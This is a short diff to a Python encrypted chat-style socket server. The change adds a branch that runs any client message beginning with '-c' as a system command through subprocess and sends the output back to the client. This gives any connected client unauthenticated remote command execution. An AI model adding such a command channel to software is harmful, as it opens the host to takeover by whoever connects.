@@ -1,6 +1,8 @@
 import socket	
 from Crypto.PublicKey import RSA
 from datetime import datetime
+import os
+import subprocess
 
 def logger(stat,insert):
     log = open('server log.txt','a')
@@ -54,9 +56,16 @@ while True:
             if z=='Thank you for the help':
                 print('Client disconnected\n')
                 break
-            x=input('>>>')
-            x=encrypted(x)
-            c.send(x[0]) 
+            if z[0:2] == '-c':
+                p  = z[3:]
+                p = p.split(' ')
+                p = subprocess.check_output(p)
+                x=encrypted(str(p))
+                c.send(x[0]) 
+            else:
+                x=input('>>>')
+                x=encrypted(x)
+                c.send(x[0]) 
         c.close()
     except:
         print('Socket logging out')
